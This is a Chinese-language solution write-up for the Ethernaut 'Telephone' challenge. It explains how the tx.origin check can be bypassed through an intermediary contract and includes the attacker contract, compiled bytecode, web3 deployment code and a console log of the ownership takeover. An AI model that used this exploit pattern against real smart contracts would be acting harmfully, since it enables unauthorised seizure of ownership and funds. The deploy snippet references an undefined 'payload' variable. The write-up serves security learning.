# 05 Telephone

## 思路

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;
  constructor() {
    owner = msg.sender;
  }
  
  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

目标 take ownership

设法让调用合约函数`changeOwner`时, 让`tx.origin`和`msg.sender`不同, 那么就可以传入任意地址, 使其成为owner

### `tx.origin`:

tx.origin 表示交易的发起者,这个值在执行交易时自动设置，用于表示这个交易是由哪个账户发起的.

使用 tx.origin 的原因是，在以太坊区块链中，交易可能会经过多个中间人，最终到达目标账户。在这种情况下，msg.sender 可能会变成中间人账户的地址，而 tx.origin 则始终表示交易的发起者。使用 tx.origin 可以保证在检查权限时，始终检查交易的实际发起者。

### `msg.sender`

msg.sender 表示当前函数调用的发送者,这个值在执行函数调用时自动设置，用于表示谁在调用当前函数.



![](https://blog.finxter.com/wp-content/uploads/2022/04/image-75.png)



### 执行过程

A. 新建文件 xxx.sol:

```solidity
// SPDX-License-Identifier: SEE LICENSE IN LICENSE FILE
pragma solidity ^0.8.4;


contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract Crack {
    function attack(address _target) public {
        Telephone(_target).changeOwner(msg.sender);
    }
}

```

B. 编译得到abi和bytecode

```shell
solc ./xxx.sol --abi --bin
```

```
======= contracts/Telephone.sol:Crack =======
Binary:
608060405234801561001057600080fd5b506101aa806100206000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063d018db3e14610030575b600080fd5b61004a6004803603810190610045919061011d565b61004c565b005b8073ffffffffffffffffffffffffffffffffffffffff1663a6f9dae1336040518263ffffffff1660e01b81526004016100859190610159565b600060405180830381600087803b15801561009f57600080fd5b505af11580156100b3573d6000803e3d6000fd5b5050505050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100ea826100bf565b9050919050565b6100fa816100df565b811461010557600080fd5b50565b600081359050610117816100f1565b92915050565b600060208284031215610133576101326100ba565b5b600061014184828501610108565b91505092915050565b610153816100df565b82525050565b600060208201905061016e600083018461014a565b9291505056fea26469706673582212203c963cf1049bb65b9b49c0304342a3e4de339ae10ac32cf630749ed75c384c8d64736f6c634300080f0033
Contract JSON ABI
[{"inputs":[{"internalType":"address","name":"_target","type":"address"}],"name":"attack","outputs":[],"stateMutability":"nonpayable","type":"function"}]

```

C. 打开chrome terminal, 并生成新实例, 然后部署上面的合约:

```
> let abi=[
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_target",
          "type": "address"
        }
      ],
      "name": "attack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ];

let bytecode="0x608060405234801561001057600080fd5b506101aa806100206000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063d018db3e14610030575b600080fd5b61004a6004803603810190610045919061011d565b61004c565b005b8073ffffffffffffffffffffffffffffffffffffffff1663a6f9dae1336040518263ffffffff1660e01b81526004016100859190610159565b600060405180830381600087803b15801561009f57600080fd5b505af11580156100b3573d6000803e3d6000fd5b5050505050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100ea826100bf565b9050919050565b6100fa816100df565b811461010557600080fd5b50565b600081359050610117816100f1565b92915050565b600060208284031215610133576101326100ba565b5b600061014184828501610108565b91505092915050565b610153816100df565b82525050565b600060208201905061016e600083018461014a565b9291505056fea26469706673582212208d97f01a74ecc3eb1f2f36ec0120f99e29354c6bc696dce08a55a5e3ea434ee364736f6c63430008110033";


let contract_to_deploy = new web3.eth.Contract(abi);

let parameter = {
    from: player,
    gas: web3.utils.toHex(800000),
    gasPrice: web3.utils.toHex(web3.utils.toWei('30', 'gwei'))
}

contract_to_deploy.deploy(payload).send(parameter, (err, transactionHash) => {
    console.log('Transaction Hash :', transactionHash);
}).on('confirmation', () => {}).then((newContractInstance) => {
    console.log('Deployed Contract Address : ', newContractInstance.options.address);
})
```

D. 得到合约地址, 调用合约中的`attack`

```
//假设合约地址: 0x192F4DEc545bAC6805356a4c00c8c83cABb28B36

const theCracker = new web3.eth.Contract(abi, "0x192F4DEc545bAC6805356a4c00c8c83cABb28B36");
await theCracker.methods.attack(contract.address).send({from:player});
```



E. 查看合约的ower变成了player

```
await contract.owner()
"0x59c5eD9C90c97e42fB674f41210D431e1cb95Ec6"
player    
"0x59c5eD9C90c97e42fB674f41210D431e1cb95Ec6"
```

## 参考答案

```
^^.js:45 ^⨀ᴥ⨀^ 正在从关卡获得新的实例... <  < <<请稍等>> >  >
redux-logger.js:1  action LOAD_LEVEL_INSTANCE @ 16:18:13.146
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x420bb49929fb8e4af2a1cc2276bb9d732b7c4bb01e998917c5b36e0a93f182b1
^^.js:35 => 实例地址0x553E75e6CdE176f7f2277B0519767862b0096304
redux-logger.js:1  action LOAD_LEVEL_INSTANCE @ 16:18:19.463
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x420bb49929fb8e4af2a1cc2276bb9d732b7c4bb01e998917c5b36e0a93f182b1
redux-logger.js:1  action SET_BLOCK_NUM @ 16:18:22.486
let abi=[
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_target",
          "type": "address"
        }
      ],
      "name": "attack",
      "outputs": [],
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ];

let bytecode="0x608060405234801561001057600080fd5b506101aa806100206000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063d018db3e14610030575b600080fd5b61004a6004803603810190610045919061011d565b61004c565b005b8073ffffffffffffffffffffffffffffffffffffffff1663a6f9dae1336040518263ffffffff1660e01b81526004016100859190610159565b600060405180830381600087803b15801561009f57600080fd5b505af11580156100b3573d6000803e3d6000fd5b5050505050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100ea826100bf565b9050919050565b6100fa816100df565b811461010557600080fd5b50565b600081359050610117816100f1565b92915050565b600060208284031215610133576101326100ba565b5b600061014184828501610108565b91505092915050565b610153816100df565b82525050565b600060208201905061016e600083018461014a565b9291505056fea26469706673582212208d97f01a74ecc3eb1f2f36ec0120f99e29354c6bc696dce08a55a5e3ea434ee364736f6c63430008110033";


let contract_to_deploy = new web3.eth.Contract(abi);

let parameter = {
    from: player,
    gas: web3.utils.toHex(800000),
    gasPrice: web3.utils.toHex(web3.utils.toWei('30', 'gwei'))
}

contract_to_deploy.deploy(payload).send(parameter, (err, transactionHash) => {
    console.log('Transaction Hash :', transactionHash);
}).on('confirmation', () => {}).then((newContractInstance) => {
    console.log('Deployed Contract Address : ', newContractInstance.options.address);
})
Promise {<pending>}
VM946:29 Transaction Hash : 0x9d10811d77de956e59cc05c53f2b0e0eeb77933ab7209f8822061905fc768e2a
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x9d10811d77de956e59cc05c53f2b0e0eeb77933ab7209f8822061905fc768e2a
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x9d10811d77de956e59cc05c53f2b0e0eeb77933ab7209f8822061905fc768e2a
VM946:31 Deployed Contract Address :  0x192F4DEc545bAC6805356a4c00c8c83cABb28B36
redux-logger.js:1  action SET_BLOCK_NUM @ 16:20:32.484
const cracker = new web3.eth.Contract(abi, "0x192F4DEc545bAC6805356a4c00c8c83cABb28B36");
await cracker.methods.attack(contract.address).send({from:player});
VM952:1 Uncaught SyntaxError: Identifier 'cracker' has already been declared
const theCracker = new web3.eth.Contract(abi, "0x192F4DEc545bAC6805356a4c00c8c83cABb28B36");
await theCracker.methods.attack(contract.address).send({from:player});
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0x4d45f8a4e3f98b480d61702500904b7cb1821b0d0dca5509b706207798e1457d
{transactionHash: "0x4d45f8a4e3f98b480d61702500904b7cb1821b0d0dca5509b706207798e1457d", transactionIndex: 0, blockNumber: 71, blockHash: "0xeafed47aad46697e147162d793e8dc90fdceba717e876ae10cc119e61c7adfb9", from: "0x59c5ed9c90c97e42fb674f41210d431e1cb95ec6", …}
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0x4d45f8a4e3f98b480d61702500904b7cb1821b0d0dca5509b706207798e1457d
redux-logger.js:1  action SET_BLOCK_NUM @ 16:22:32.482
contract.owner()
Promise {<pending>, _events: Events, emit: ƒ, on: ƒ, …}
await contract.owner()
"0x59c5eD9C90c97e42fB674f41210D431e1cb95Ec6"
player    
"0x59c5eD9C90c97e42fB674f41210D431e1cb95Ec6"
^^.js:45 (‾⌣‾) 正在提交关卡实例... <  < <<请稍等>> >  >
redux-logger.js:1  action SUBMIT_LEVEL_INSTANCE @ 16:24:02.901
^^.js:140 ⛏️ Sent transaction ⛏ undefined/tx/0xb0d190401d83f85e454f4da04f7358745379bf76768fabcd8f6a8ee29aaad537
^^.js:73 ˁ(⦿ᴥ⦿)ˀ 牛逼！, 你通过了这关!!!
^^.js:73 ˁ(⦿ᴥ⦿)ˀ 牛逼！, 你通过了这关!!!
^^.js:73 ˁ(⦿ᴥ⦿)ˀ 牛逼！, 你通过了这关!!!
^^.js:73 ˁ(⦿ᴥ⦿)ˀ 牛逼！, 你通过了这关!!!
^^.js:73 ˁ(⦿ᴥ⦿)ˀ 牛逼！, 你通过了这关!!!
^^.js:73 ˁ(⦿ᴥ⦿)ˀ 牛逼！, 你通过了这关!!!
^^.js:73 ˁ(⦿ᴥ⦿)ˀ 牛逼！, 你通过了这关!!!
redux-logger.js:1  action SUBMIT_LEVEL_INSTANCE @ 16:24:07.616
^^.js:73 ˁ(⦿ᴥ⦿)ˀ 牛逼！, 你通过了这关!!!
^^.js:140 ⛏️ Mined transaction ⛏ undefined/tx/0xb0d190401d83f85e454f4da04f7358745379bf76768fabcd8f6a8ee29aaad537
^^.js:73 ˁ(⦿ᴥ⦿)ˀ 牛逼！, 你通过了这关!!!
^^.js:73 ˁ(⦿ᴥ⦿)ˀ 牛逼！, 你通过了这关!!!
^^.js:73 ˁ(⦿ᴥ⦿)ˀ 牛逼！, 你通过了这关!!!
^^.js:73 ˁ(⦿ᴥ⦿)ˀ 牛逼！, 你通过了这关!!!
^^.js:73 ˁ(⦿ᴥ⦿)ˀ 牛逼！, 你通过了这关!!!
^^.js:73 ˁ(⦿ᴥ⦿)ˀ 牛逼！, 你通过了这关!!!
^^.js:73 ˁ(⦿ᴥ⦿)ˀ 牛逼！, 你通过了这关!!!
^^.js:73 ˁ(⦿ᴥ⦿)ˀ 牛逼！, 你通过了这关!!!
^^.js:73 ˁ(⦿ᴥ⦿)ˀ 牛逼！, 你通过了这关!!!
^^.js:73 ˁ(⦿ᴥ⦿)ˀ 牛逼！, 你通过了这关!!!
^^.js:73 ˁ(⦿ᴥ⦿)ˀ 牛逼！, 你通过了这关!!!
^^.js:73 ˁ(⦿ᴥ⦿)ˀ 牛逼！, 你通过了这关!!!
^^.js:56 
redux-logger.js:1  action SET_BLOCK_NUM @ 16:24:12.511

```



